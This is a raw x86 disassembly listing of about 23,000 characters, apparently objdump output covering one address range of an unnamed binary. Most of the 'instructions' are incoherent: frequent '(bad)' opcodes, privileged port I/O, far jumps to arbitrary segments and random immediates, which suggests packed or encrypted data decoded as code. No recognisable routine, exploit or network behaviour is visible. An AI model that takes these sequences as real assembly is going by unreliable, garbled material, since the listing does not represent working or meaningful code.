  423901:	les    ebp,FWORD PTR [esi]
  423903:	dec    edx
  423904:	pop    ebp
  423905:	neg    DWORD PTR [eax+eiz*4-0x7b6d13bd]
  42390c:	adc    DWORD PTR [ebp+0x55],esp
  42390f:	sbb    DWORD PTR [edi+0x7ded5e1c],edx
  423915:	mov    edi,0xf0466250
  42391a:	nop
  42391b:	dec    ecx
  42391c:	fs test al,0xa0
  42391f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423920:	popa   
  423921:	loope  0x4238ed
  423923:	cwde   
  423924:	lods   al,BYTE PTR ds:[esi]
  423925:	push   edi
  423926:	sti    
  423927:	loope  0x42398f
  423929:	push   cs
  42392a:	cdq    
  42392b:	sbb    ah,BYTE PTR [edx]
  42392d:	push   esp
  42392e:	lds    edx,FWORD PTR [eax-0x37]
  423931:	lods   eax,DWORD PTR ds:[esi]
  423932:	sbb    BYTE PTR ds:0x729a5ab1,al
  423938:	stos   BYTE PTR es:[edi],al
  423939:	jbe    0x4238d4
  42393b:	ins    BYTE PTR es:[edi],dx
  42393c:	mov    dh,0x52
  42393e:	xchg   edi,eax
  42393f:	mov    edi,0x13f27e09
  423944:	mov    ds:0xfc32f331,eax
  423949:	aam    0x80
  42394b:	idiv   DWORD PTR [eax-0x35]
  42394e:	inc    esp
  42394f:	fwait
  423950:	xchg   BYTE PTR [ebp+eax*2-0x4830c4b6],ah
  423957:	repz fsubr DWORD PTR ds:[ecx-0x4bef520a]
  42395f:	jmp    0x423982
  423961:	sbb    cl,al
  423963:	dec    edx
  423964:	fadd   st,st(5)
  423966:	test   ebp,edx
  423968:	jmp    0x0:0xf73156ac
	...
  4239d3:	add    BYTE PTR [eax],al
  4239d5:	add    BYTE PTR [edx-0x770e5c],cl
  4239db:	(bad)  
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x1da72bbd
  4239e4:	gs and eax,eax
  4239e7:	jge    0x4239ea
  4239e9:	add    bh,bh
  4239eb:	add    BYTE PTR [eax],al
  4239ed:	add    al,ch
  4239ef:	arpl   WORD PTR [esp+ecx*1-0x30],bp
  4239f3:	or     cl,BYTE PTR [eax]
  4239f5:	lea    ebx,[eax-0x36]
  4239f8:	ret    
  4239f9:	add    edi,DWORD PTR [ecx+0x57903f23]
  4239ff:	xchg   ebp,eax
  423a00:	pop    ebx
  423a01:	adc    edx,DWORD PTR [eax]
  423a03:	mov    esp,0x99fb9e79
  423a08:	add    al,0xe6
  423a0a:	sbb    eax,0xe429eb2e
  423a0f:	fnsave [edx]
  423a11:	ret    0x1da0
  423a14:	pusha  
  423a15:	mov    ds:0xd9c1eb1,eax
  423a1a:	call   0x368c0138
  423a1f:	jmp    0x2dca7d8
  423a24:	out    0xc2,eax
  423a26:	test   al,0xb1
  423a28:	xor    BYTE PTR [ebp+ebp*8+0x73],dh
  423a2c:	sahf   
  423a2d:	sub    BYTE PTR [ecx+0x667eab83],bh
  423a33:	stos   BYTE PTR es:[edi],al
  423a34:	std    
  423a35:	xor    edx,edx
  423a37:	scas   al,BYTE PTR es:[edi]
  423a38:	push   cs
  423a39:	pop    ebx
  423a3a:	loopne 0x423a6d
  423a3c:	fwait
  423a3d:	xor    BYTE PTR [ebp+0x621581a9],ch
  423a43:	add    DWORD PTR [edx-0x2b],ecx
  423a46:	iret   
  423a47:	xchg   edi,eax
  423a48:	(bad)  
  423a49:	repz xor DWORD PTR [edi],esp
  423a4c:	stos   DWORD PTR es:[edi],eax
  423a4d:	inc    edx
  423a4e:	cmp    eax,0xa96599c4
  423a53:	xchg   ebx,eax
  423a54:	iret   
  423a55:	sbb    DWORD PTR [ebp+0x4b],edx
  423a58:	cmc    
  423a59:	(bad)  
  423a5a:	(bad)  
  423a5b:	ds dec ebx
  423a5d:	jl     0x423a80
  423a5f:	pop    edi
  423a60:	test   DWORD PTR [ecx-0x10239a25],0xc2981adb
  423a6a:	sti    
  423a6b:	add    BYTE PTR [ebp-0x40878ad2],bh
  423a71:	fs xchg edx,eax
  423a73:	test   eax,0x9e1d3844
  423a78:	fild   DWORD PTR [ebp-0x7b9bda9]
  423a7e:	or     al,0xc9
  423a80:	in     al,dx
  423a81:	push   ecx
  423a82:	clc    
  423a83:	adc    al,BYTE PTR [edi-0x38]
  423a86:	mov    ss,WORD PTR [edi+0x3db4b241]
  423a8c:	outs   dx,DWORD PTR ds:[esi]
  423a8d:	push   ss
  423a8e:	xor    bh,BYTE PTR [esi]
  423a90:	out    dx,al
  423a91:	inc    esi
  423a92:	xor    BYTE PTR [eax+0x7f],bl
  423a95:	xor    al,0xf3
  423a97:	cld    
  423a98:	and    al,0xf
  423a9a:	je     0x423aa8
  423a9c:	jno    0x423a4a
  423a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a9f:	or     ebx,DWORD PTR [si-0x50e8]
  423aa4:	(bad)  
  423aa5:	(bad)  
  423aa6:	(bad)  
  423aa7:	sti    
  423aa8:	(bad)  [esi*2-0x7786c82c]
  423aaf:	in     ax,dx
  423ab1:	idiv   BYTE PTR [ebx+ebx*4-0x68]
  423ab5:	sbb    DWORD PTR [ecx+0x54],edx
  423ab8:	je     0x423a44
  423aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423abb:	push   edx
  423abc:	loop   0x423a5d
  423abe:	nop
  423abf:	(bad)  
  423ac0:	pop    ebp
  423ac1:	sbb    al,0xca
  423ac3:	pop    es
  423ac4:	push   0x9b8fa4f
  423ac9:	loopne 0x423b4a
  423acb:	mov    eax,?
  423acd:	adc    BYTE PTR [edx+0xb6c2862],al
  423ad3:	push   ebp
  423ad4:	push   edx
  423ad5:	pop    es
  423ad6:	jg     0x423b32
  423ad8:	cmp    BYTE PTR [eax-0x4f],ch
  423adb:	inc    ebp
  423adc:	lahf   
  423add:	bound  edx,QWORD PTR [eax+0x1c]
  423ae0:	repnz in al,dx
  423ae2:	mov    ebx,0x539869
  423ae7:	leave  
  423ae8:	jb     0x423ae2
  423aea:	dec    eax
  423aeb:	xor    al,0xd7
	...
  423b55:	add    BYTE PTR [eax],dh
  423b57:	cmp    eax,0xdf7d9f75
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	mov    eax,0xbf9a3ddb
  423b67:	jle    0x423b6a
  423b69:	add    bh,bh
  423b6b:	add    BYTE PTR [eax],al
  423b6d:	add    BYTE PTR [esi+0x30],dh
  423b70:	rcl    DWORD PTR [esp+eax*4-0xe],cl
  423b74:	xchg   ah,cl
  423b76:	adc    bh,BYTE PTR [ebp+0x69]
  423b79:	ret    0xc45b
  423b7c:	adc    eax,0x52e3ffba
  423b81:	aad    0x47
  423b83:	fadd   st,st(3)
  423b85:	and    eax,0x35a1dcde
  423b8a:	xor    BYTE PTR [edx+ecx*1-0xb43d661],ch
  423b91:	jne    0x423b4e
  423b93:	gs mov ebp,0x8e0efdc0
  423b99:	xchg   ebp,eax
  423b9a:	into   
  423b9b:	js     0x423c19
  423b9d:	test   DWORD PTR [ecx+0x4d],edi
  423ba0:	xchg   esi,eax
  423ba1:	(bad)  
  423ba2:	sahf   
  423ba3:	dec    ebx
  423ba4:	or     al,0x3a
  423ba6:	popa   
  423ba7:	mov    edi,0x76a342d2
  423bac:	dec    BYTE PTR [edx+edx*1-0x4d]
  423bb0:	cmp    DWORD PTR [ebp+eiz*4-0x75b07ead],esp
  423bb7:	stos   DWORD PTR es:[edi],eax
  423bb8:	pop    es
  423bb9:	mov    dh,BYTE PTR [edx]
  423bbb:	jmp    0xf76:0x3ff10a45
  423bc2:	ret    0xd65f
  423bc5:	pusha  
  423bc6:	cmp    DWORD PTR [ebx-0x1da1a4c7],ecx
  423bcc:	cmovp  ecx,esp
  423bcf:	adc    ch,BYTE PTR [ebx+ecx*2-0x4a]
  423bd3:	sbb    cl,bl
  423bd5:	mov    bh,0xf5
  423bd7:	ds (bad) 
  423bd9:	std    
  423bda:	aad    0x59
  423bdc:	mov    ah,0x2e
  423bde:	or     BYTE PTR [esi+0x50833c7],bl
  423be4:	mov    cs,WORD PTR [esi+0x74f7114b]
  423bea:	and    BYTE PTR [edi+0x2e],ah
  423bed:	adc    edx,DWORD PTR [ebp-0x6]
  423bf0:	std    
  423bf1:	and    BYTE PTR [ecx],0x57
  423bf4:	mov    ds:0xc33af1a2,al
  423bf9:	jl     0x423bcc
  423bfb:	adc    al,0xea
  423bfd:	in     al,0xb5
  423bff:	mov    al,ds:0x90bc1d52
  423c04:	mov    dl,0xde
  423c06:	add    ah,BYTE PTR [ecx]
  423c08:	cmp    eax,0xfd3ca3f5
  423c0d:	lds    edx,FWORD PTR [eax+0x32]
  423c10:	js     0x423bed
  423c12:	and    dh,BYTE PTR [edx-0x51]
  423c15:	mov    bh,0xbd
  423c17:	xlat   BYTE PTR ds:[ebx]
  423c18:	ins    BYTE PTR es:[edi],dx
  423c19:	sub    eax,0x374e206
  423c1e:	shl    DWORD PTR [edi+edi*8],1
  423c21:	arpl   WORD PTR [edi+0x3ff60606],ax
  423c27:	adc    cl,al
  423c29:	inc    esi
  423c2a:	mov    edi,DWORD PTR [edx-0x442b2c82]
  423c30:	adc    al,0x8b
  423c32:	inc    edx
  423c33:	repz loop 0x423ca0
  423c36:	stos   BYTE PTR es:[edi],al
  423c37:	fwait
  423c38:	dec    esi
  423c39:	jle    0x423bd9
  423c3b:	mov    ch,0x1c
  423c3d:	mov    ebx,0x96d9fd54
  423c42:	aaa    
  423c43:	mov    edi,0x89ea49f4
  423c48:	cmp    eax,0x78844ca8
  423c4d:	mov    ebx,0x9d706fc6
  423c52:	jo     0x423c7a
  423c54:	fsub   DWORD PTR gs:[ebx+0x1112611f]
  423c5b:	push   esp
  423c5c:	mov    eax,0x1f321f95
  423c61:	add    ebx,DWORD PTR [edx]
  423c63:	fsub   QWORD PTR [ecx]
  423c65:	inc    ebx
  423c66:	stc    
  423c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c68:	mov    eax,ds:0x8a4ab0f
	...
  423cd5:	add    ch,bh
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax+0x14446617]
  423ce3:	(bad)  
  423ce4:	int    0xe4
  423ce6:	mov    esi,0xff00017f
  423ceb:	add    BYTE PTR [eax],al
  423ced:	add    BYTE PTR [eax+0x5e],cl
  423cf0:	pop    es
  423cf1:	enter  0x715,0x2f
  423cf5:	xchg   edi,eax
  423cf6:	ror    BYTE PTR [esi+0x60],1
  423cf9:	cli    
  423cfa:	in     al,0xc7
  423cfc:	jl     0x423d7a
  423cfe:	or     ebx,DWORD PTR [edi-0x600c65a9]
  423d04:	call   0x4019:0x876d0
  423d0b:	xor    cl,ah
  423d0d:	push   0xffffffe3
  423d0f:	in     eax,0x58
  423d11:	dec    edx
  423d12:	push   esp
  423d13:	mov    esp,0xc3ca6bde
  423d18:	cmp    al,0x95
  423d1a:	out    0xe7,eax
  423d1c:	popa   
  423d1d:	mov    bh,0xa6
  423d1f:	stos   BYTE PTR es:[edi],al
  423d20:	mov    esp,0x7188568
  423d25:	push   edx
  423d26:	add    edx,ecx
  423d28:	out    dx,al
  423d29:	test   BYTE PTR [edi-0x6cbb9b39],0x38
  423d30:	add    ah,al
  423d32:	(bad)  
  423d33:	xor    BYTE PTR ds:0x9c5c17a7,ah
  423d39:	xchg   edx,eax
  423d3a:	in     eax,dx
  423d3b:	xor    DWORD PTR [eax],esp
  423d3d:	push   es
  423d3e:	pop    edx
  423d3f:	shl    edx,1
  423d41:	hlt    
  423d42:	jp     0x423d02
  423d44:	loop   0x423d70
  423d46:	std    
  423d47:	(bad)  
  423d48:	pop    edi
  423d49:	dec    esi
  423d4a:	xor    dh,BYTE PTR [ebx+edi*4]
  423d4d:	push   0x62
  423d4f:	add    al,0xa7
  423d51:	jp     0x423d85
  423d53:	mov    ebx,DWORD PTR [edi+0x27e4d8e8]
  423d59:	in     eax,dx
  423d5a:	pushf  
  423d5b:	sub    bh,bh
  423d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d5e:	jmp    0xff6e:0x73b94534
  423d65:	loope  0x423d32
  423d67:	cld    
  423d68:	jle    0x423d75
  423d6a:	jg     0x423d5b
  423d6c:	or     BYTE PTR cs:[eax-0x7b],al
  423d70:	ja     0x423cf8
  423d72:	imul   ebx,esp,0x65
  423d75:	in     al,0x9
  423d77:	loopne 0x423d21
  423d79:	sub    eax,0x32e62a25
  423d7e:	jle    0x423dcb
  423d80:	push   edi
  423d81:	mov    edi,0x97d0c835
  423d86:	fisub  DWORD PTR [edi]
  423d88:	repnz add dh,BYTE PTR [edx-0x1e]
  423d8c:	in     al,dx
  423d8d:	and    al,dl
  423d8f:	mov    eax,0x7f71d997
  423d94:	cmp    edi,DWORD PTR [eax-0x56]
  423d97:	aad    0x5a
  423d99:	xor    cl,bh
  423d9b:	fild   DWORD PTR [esi-0x5ff9150e]
  423da1:	lock push esp
  423da3:	cmp    al,BYTE PTR [ecx+eiz*1-0x664fe3c0]
  423daa:	test   al,0x5c
  423dac:	adc    BYTE PTR [esi+esi*8-0x13],dh
  423db0:	int3   
  423db1:	sub    ecx,DWORD PTR [eax]
  423db3:	or     bl,BYTE PTR [esi]
  423db5:	jne    0x423df7
  423db7:	enter  0x3ef8,0xc0
  423dbb:	pushf  
  423dbc:	sbb    edi,esp
  423dbe:	cmc    
  423dbf:	es push ecx
  423dc1:	aaa    
  423dc2:	fst    DWORD PTR [ebx]
  423dc4:	dec    edx
  423dc5:	jmp    0x7b82bd76
  423dca:	outs   dx,DWORD PTR ds:[esi]
  423dcb:	out    0x2f,eax
  423dcd:	repz arpl WORD PTR [esi-0x658921ac],si
  423dd4:	test   eax,0xf0d425fb
  423dd9:	pop    ss
  423dda:	sbb    eax,0xef2e920d
  423ddf:	loope  0x423d6b
  423de1:	es mov dh,0x4b
  423de4:	dec    ecx
  423de5:	and    esp,DWORD PTR [ecx-0x29]
  423de8:	ret    0xfba0
  423deb:	fsub   DWORD PTR [esi+0x0]
	...
  423e55:	add    BYTE PTR [edx-0xa],ah
  423e58:	xchg   DWORD PTR [ecx],ecx
  423e5a:	xchg   edi,eax
  423e5b:	jns    0x423e4b
  423e5d:	jmp    DWORD PTR [edi]
  423e5f:	mov    DWORD PTR [eax-0x2c341c2e],esp
  423e65:	mov    al,ds:0x180bd
  423e6a:	inc    DWORD PTR [eax]
  423e6c:	add    BYTE PTR [eax],al
  423e6e:	xor    al,0xfe
  423e70:	mov    ecx,0xc859b694
  423e75:	popf   
  423e76:	leave  
  423e77:	or     eax,0x1bf4d61f
  423e7c:	das    
  423e7d:	xor    DWORD PTR [esp+eax*8+0x31957784],ebx
  423e84:	push   es
  423e85:	cli    
  423e86:	mov    bh,0xd1
  423e88:	std    
  423e89:	push   eax
  423e8a:	fistp  DWORD PTR [edx-0x639c35a4]
  423e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e91:	dec    ecx
  423e92:	add    ebx,DWORD PTR [ebx-0x302936e9]
  423e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e99:	jp     0x423ed5
  423e9b:	pop    ds
  423e9c:	jnp    0x423e8a
  423e9e:	jmp    0x423eb3
  423ea0:	mov    esi,0x7cc17388
  423ea5:	sub    bl,BYTE PTR [esi]
  423ea7:	ja     0x423e78
  423ea9:	jge    0x423e40
  423eab:	pop    eax
  423eac:	dec    edi
  423ead:	xor    al,0x33
  423eaf:	cwde   
  423eb0:	pinsrw mm7,esi,0x4a
  423eb4:	gs xchg ebp,eax
  423eb6:	jne    0x423e84
  423eb8:	aaa    
  423eb9:	adc    DWORD PTR [eax+0x33],edi
  423ebc:	xlat   BYTE PTR ds:[ebx]
  423ebd:	jnp    0x423ec4
  423ebf:	fs es ret 0xe3df
  423ec4:	psubsw mm2,mm1
  423ec7:	mov    ah,BYTE PTR [edx-0x33]
  423eca:	push   ss
  423ecb:	not    DWORD PTR [ecx-0x76ad8d3b]
  423ed1:	int    0xd
  423ed3:	jo     0x423ecb
  423ed5:	push   ebp
  423ed6:	test   al,0x77
  423ed8:	cs push ss
  423eda:	cmp    bh,BYTE PTR [esi]
  423edc:	sahf   
  423edd:	pop    esp
  423ede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423edf:	xchg   edi,eax
  423ee0:	push   ecx
  423ee1:	out    dx,al
  423ee2:	xchg   edi,eax
  423ee3:	int3   
  423ee4:	lahf   
  423ee5:	rcl    BYTE PTR [ebp+0x47],1
  423ee8:	cwde   
  423ee9:	dec    edx
  423eea:	aas    
  423eeb:	or     DWORD PTR [esi],esi
  423eed:	call   0x8bec3efe
  423ef2:	cmc    
  423ef3:	fwait
  423ef4:	in     al,dx
  423ef5:	retf   
  423ef6:	lahf   
  423ef7:	pop    edx
  423ef8:	push   ebx
  423ef9:	pop    ebx
  423efa:	js     0x423f54
  423efc:	inc    esi
  423efd:	div    al
  423eff:	xchg   BYTE PTR [eax],dh
  423f01:	pop    ss
  423f02:	call   0xa4b32f7e
  423f07:	jmp    0x578c887f
  423f0c:	pusha  
  423f0d:	xor    BYTE PTR es:[ebx+0x15],bh
  423f11:	dec    ebp
  423f12:	cwde   
  423f13:	sub    DWORD PTR [edx+0x79b53f69],0x7a60799e
  423f1d:	fistp  DWORD PTR [edx-0x43]
  423f20:	inc    edi
  423f21:	nop
  423f22:	cmc    
  423f23:	sub    dl,bh
  423f25:	add    eax,DWORD PTR [edi]
  423f27:	mov    ch,0x2d
  423f29:	rcl    DWORD PTR [esi-0x5b],1
  423f2c:	and    bl,BYTE PTR [ebx+edx*8-0x55]
  423f30:	xchg   ebp,eax
  423f31:	dec    esi
  423f32:	mov    bh,0x47
  423f34:	in     eax,dx
  423f35:	(bad)
  423f39:	push   ebp
  423f3a:	data16 and BYTE PTR [edx+0x75],bl
  423f3e:	xor    bl,BYTE PTR [ecx+0x3f984af5]
  423f44:	pop    es
  423f45:	rcl    BYTE PTR [edi-0x1b40d12d],0x4b
  423f4c:	call   0x8f8f:0xa10a2c35
  423f53:	xchg   esp,eax
  423f54:	ins    BYTE PTR es:[edi],dx
  423f55:	mov    DWORD PTR [edi+0x511ea75],esi
  423f5b:	dec    edi
  423f5c:	popf   
  423f5d:	mov    cs,WORD PTR [ecx]
  423f5f:	je     0x423f69
  423f61:	(bad)  
  423f62:	jno    0x423f70
  423f64:	test   eax,0xcc1d0208
  423f69:	outs   dx,BYTE PTR ds:[esi]
  423f6a:	dec    ebx
  423f6b:	xor    BYTE PTR [ebx+0x0],0x0
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	mov    esi,0xbc273c71
  423fe7:	add    DWORD PTR [ecx],0xff00
  423fed:	add    dl,bh
  423fef:	retf   0x676f
  423ff2:	mov    ebp,0xfe3dc7f2
  423ff7:	lds    edx,FWORD PTR [ecx+0x4b7180ff]
  423ffd:	shl    BYTE PTR [eax],0xc4
  424000:	and    eax,0xbaf3b9a4
  424005:	out    0xc1,eax
  424007:	js     0x424013
  424009:	jns    0x424045
  42400b:	jp     0x424052
  42400d:	push   eax
  42400e:	sub    DWORD PTR [ebp-0x15],ebp
  424011:	nop
  424012:	xchg   esi,eax
  424013:	loopne 0x424089
  424015:	inc    ebx
  424016:	add    ecx,ebx
  424018:	call   0x48137e32
  42401d:	inc    edx
  42401e:	vshufps xmm6,xmm6,XMMWORD PTR [ecx],0x57
  424023:	push   ecx
  424024:	jmp    0x424016
  424026:	inc    edx
  424027:	jbe    0x424087
  424029:	loopne 0x424097
  42402b:	retf   0xda13
  42402e:	pop    edx
  42402f:	inc    ecx
  424030:	jmp    0x424070
  424032:	pop    edi
  424033:	or     DWORD PTR [eax],edi
  424035:	scas   al,BYTE PTR es:[edi]
  424036:	out    dx,al
  424037:	stos   BYTE PTR es:[edi],al
  424038:	dec    ebp
  424039:	mov    eax,0x568f9148
  42403e:	inc    esp
  42403f:	mov    ch,0x5a
  424041:	sbb    eax,0x11523aaa
  424046:	push   DWORD PTR [edi+0x47]
  424049:	cmp    ecx,edi
  42404b:	sub    edx,DWORD PTR [ebx]
  42404d:	ins    DWORD PTR es:[edi],dx
  42404e:	adc    esp,esi
  424050:	and    dh,BYTE PTR [ecx+0x2c21b7aa]
  424056:	and    eax,0xc2f8cac5
  42405b:	cmp    al,0xc8
  42405d:	rol    DWORD PTR [ecx+0x1],1
  424060:	ins    BYTE PTR es:[edi],dx
  424061:	fldenv [esi-0x78]
  424064:	das    
  424065:	dec    ebx
  424066:	scas   al,BYTE PTR es:[edi]
  424067:	sbb    bl,BYTE PTR [eax]
  424069:	and    BYTE PTR [ecx+0x296691bb],al
  42406f:	fs jle 0x4240d0
  424072:	dec    eax
  424073:	repnz leave 
  424075:	aad    0xc2
  424077:	xor    ah,bh
  424079:	dec    eax
  42407a:	out    0x89,eax
  42407c:	sbb    al,0x31
  42407e:	add    DWORD PTR [edx-0xc1314f8],esi
  424084:	pop    ss
  424085:	pusha  
  424086:	sbb    ah,ah
  424088:	sub    esp,DWORD PTR [edi-0x7a0a033]
  42408e:	jmp    0x4240d9
  424090:	retf   
  424091:	stos   DWORD PTR es:[edi],eax
  424092:	mov    ecx,0xc0c6998b
  424097:	(bad)  
  424098:	icebp  
  424099:	and    cl,ah
  42409b:	sbb    DWORD PTR [ecx+0x4794c311],ecx
  4240a1:	mov    dh,ah
  4240a3:	sbb    DWORD PTR [eax+ebx*4-0x39d75b20],edi
  4240aa:	int    0x29
  4240ac:	repnz fisub DWORD PTR [esp+edi*2]
  4240b0:	nop
  4240b1:	mov    ebp,0x954c2624
  4240b6:	aam    0xb6
  4240b8:	sbb    ch,BYTE PTR [ebx]
  4240ba:	cmc    
  4240bb:	dec    edx
  4240bc:	int    0x4b
  4240be:	je     0x424042
  4240c0:	cmp    DWORD PTR [esi+0x6c],eax
  4240c3:	mov    WORD PTR [eax],?
  4240c5:	ss sahf 
  4240c7:	mov    ecx,0xa70d411b
  4240cc:	loopne 0x42409a
  4240ce:	xor    eax,0x8c03cb44
  4240d3:	jne    0x424074
  4240d5:	test   eax,0xdc5c2b9
  4240da:	arpl   WORD PTR [edi-0x60],dx
  4240dd:	sbb    DWORD PTR [esi+ebp*4+0x73],ecx
  4240e1:	adc    eax,0x57ff1903
  4240e6:	imul   BYTE PTR [ecx]
  4240e8:	push   ebx
  4240e9:	lods   al,BYTE PTR ds:[esi]
  4240ea:	rcr    BYTE PTR [ebx+0xc4],cl
	...
  424154:	add    BYTE PTR [eax],al
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	fmul   DWORD PTR [edx-0x7]
  424165:	in     eax,0xbb
  424167:	add    BYTE PTR [ecx],0x0
  42416a:	inc    DWORD PTR [eax]
  42416c:	add    BYTE PTR [eax],al
  42416e:	in     al,0x34
  424170:	jmp    0x4ac83a3d
  424175:	into   
  424176:	xchg   ch,ch
  424178:	mov    ebx,DWORD PTR [esp+edx*2]
  42417b:	ret    
  42417c:	jno    0x424183
  42417e:	test   DWORD PTR [ebx],ecx
  424180:	adc    al,BYTE PTR [esi+eiz*4]
  424183:	push   esi
  424184:	mov    ds:0x1d7ba305,eax
  424189:	jbe    0x4241d4
  42418b:	adc    DWORD PTR ds:0x12ef3b2,ebx
  424191:	ret    
  424192:	dec    ebp
  424193:	jge    0x4241a7
  424195:	push   0xffffffd2
  424197:	mov    eax,ds:0x89439929
  42419c:	inc    esp
  42419d:	bound  ebx,QWORD PTR [edx+0x24]
  4241a0:	add    eax,DWORD PTR [ebx]
  4241a2:	pshufw mm4,mm0,0x6c
  4241a6:	fisttp DWORD PTR [eax]
  4241a8:	out    dx,eax
  4241a9:	jae    0x4241dc
  4241ab:	push   ebp
  4241ac:	sub    al,0x37
  4241ae:	mov    bl,BYTE PTR [esi+0x3cfbb065]
  4241b4:	mov    bl,BYTE PTR [eax]
  4241b6:	es loopne 0x4241d3
  4241b9:	in     al,dx
  4241ba:	ret    0x37e4
  4241bd:	dec    ebx
  4241be:	jmp    0xd145:0x98fb281f
  4241c5:	clc    
  4241c6:	loop   0x4241a8
  4241c8:	sbb    dl,BYTE PTR [edx]
  4241ca:	icebp  
  4241cb:	jnp    0x42423d
  4241cd:	sti    
  4241ce:	test   BYTE PTR [edx+0x4ef09fac],bl
  4241d4:	sub    edi,esp
  4241d6:	clc    
  4241d7:	inc    ecx
  4241d8:	addr16 inc ebx
  4241da:	(bad)  
  4241db:	xor    DWORD PTR [edx+0x62],esp
  4241de:	sbb    BYTE PTR [edx-0x1f5cdf61],0x4f
  4241e5:	aaa    
  4241e6:	sub    edi,DWORD PTR [edx]
  4241e8:	mov    edx,gs
  4241ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241eb:	adc    al,0x4f
  4241ed:	xchg   edx,eax
  4241ee:	data16 jnp 0x424199
  4241f1:	ret    
  4241f2:	(bad)  
  4241f3:	icebp  
  4241f4:	and    al,0x60
  4241f6:	fld    QWORD PTR [esi+0x60]
  4241f9:	mov    dl,0xbe
  4241fb:	pop    ebx
  4241fc:	xchg   ebx,eax
  4241fd:	or     al,BYTE PTR [ebx]
  4241ff:	dec    ebp
  424200:	retf   0xe1c9
  424203:	mov    ebp,0x116b2e10
  424208:	test   eax,0xe2118f62
  42420d:	push   0x48
  42420f:	aam    0xb8
  424211:	add    DWORD PTR [ecx-0xb57bfa2],esp
  424217:	or     al,0xef
  424219:	and    edi,edi
  42421b:	std    
  42421c:	mov    BYTE PTR [eax+0x70],ah
  42421f:	sub    esp,DWORD PTR [eax+ebp*2]
  424222:	dec    ebp
  424223:	mov    al,BYTE PTR [edi]
  424225:	(bad)  [ebx+0x7ab9f0d0]
  42422b:	push   ecx
  42422c:	stos   DWORD PTR es:[edi],eax
  42422d:	xchg   edx,eax
  42422e:	fadd   DWORD PTR [edi]
  424230:	push   0x65
  424232:	out    0x68,al
  424234:	sub    DWORD PTR [ebx-0x8],edx
  424237:	jnp    0x424208
  424239:	call   0x3e40:0xfca29f6d
  424240:	xor    eax,0x1057c6d5
  424245:	jo     0x4241d9
  424247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424248:	in     eax,0x91
  42424a:	dec    ecx
  42424b:	xchg   esp,eax
  42424c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42424d:	imul   ecx,eax,0x8c592ad7
  424253:	mov    eax,ds:0x3f3766da
  424258:	hlt    
  424259:	xchg   edi,eax
  42425a:	push   cs
  42425b:	add    BYTE PTR [edx+0x6e958f8d],bl
  424261:	stos   BYTE PTR es:[edi],al
  424262:	pop    ss
  424263:	ja     0x4242b1
  424265:	push   ebx
  424266:	jecxz  0x4242bb
  424268:	test   eax,0x957ddcdb
	...
  4242d5:	add    BYTE PTR [edi-0x4c275c4c],al
  4242db:	(bad)  
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	test   DWORD PTR [edx-0x7c45f80d],esp
  4242e8:	add    DWORD PTR [eax],eax
  4242ea:	inc    DWORD PTR [eax]
  4242ec:	add    BYTE PTR [eax],al
  4242ee:	rcr    cl,0x2e
  4242f1:	mov    DWORD PTR [edi],0xb4a7e1bd
  4242f7:	jmp    0x1f3f:0x26996325
  4242fe:	ret    
  4242ff:	aad    0x34
  424301:	arpl   di,ax
  424303:	mov    al,ds:0x42c793b7
  424308:	in     al,dx
  424309:	out    dx,eax
  42430a:	sub    DWORD PTR [esi],0xffffffba
  42430d:	rcr    DWORD PTR [esi-0x31],cl
  424310:	rol    DWORD PTR [esi],1
  424312:	mov    edi,0xc936bf4
  424317:	mov    bl,0x61
  424319:	inc    ebx
  42431a:	lahf   
  42431b:	mov    ebp,0x9148bb1f
  424320:	pop    es
  424321:	inc    ebx
  424322:	pop    ebx
  424323:	popa   
  424324:	mul    DWORD PTR [ebp-0x2d428483]
  42432a:	xchg   ebx,eax
  42432b:	int3   
  42432c:	loopne 0x42432d
  42432e:	shl    DWORD PTR [esi+0x2ed87b45],1
  424334:	mov    ecx,0xd58c2292
  424339:	xchg   ecx,eax
  42433a:	test   BYTE PTR [eax],dl
  42433c:	or     eax,0x903c7148
  424341:	js     0x424353
  424343:	mov    al,0x1f
  424345:	dec    esp
  424346:	icebp  
  424347:	push   ss
  424348:	imul   esp,DWORD PTR [esi+0x20617a01],0xa4e4b879
  424352:	jae    0x4243c5
  424354:	dec    edi
  424355:	int    0x7a
  424357:	dec    edx
  424358:	push   cs
  424359:	dec    eax
  42435a:	inc    eax
  42435b:	ret    
  42435c:	dec    edx
  42435d:	fisttp WORD PTR [edx+0x2d4f51b6]
  424363:	ret    
  424364:	push   ds
  424365:	popf   
  424366:	in     eax,0xa9
  424368:	xor    eax,0xf9a069f1
  42436d:	jmp    0xfe02df1b
  424372:	leave  
  424373:	jl     0x424388
  424375:	cwde   
  424376:	fsub   QWORD PTR [edi]
  424378:	add    al,0x10
  42437a:	sbb    bl,cl
  42437c:	jmp    0x424341
  42437e:	stos   DWORD PTR es:[edi],eax
  42437f:	inc    esi
  424380:	jb     0x4243bc
  424382:	add    BYTE PTR [esi],bh
  424384:	call   0xcb7d:0x1a8f09ae
  42438b:	jns    0x4243b4
  42438d:	push   esi
  42438e:	push   ss
  42438f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424390:	pop    es
  424391:	pushf  
  424392:	cmp    eax,0x8567ffcb
  424397:	popf   
  424398:	xchg   ebp,eax
  424399:	hlt    
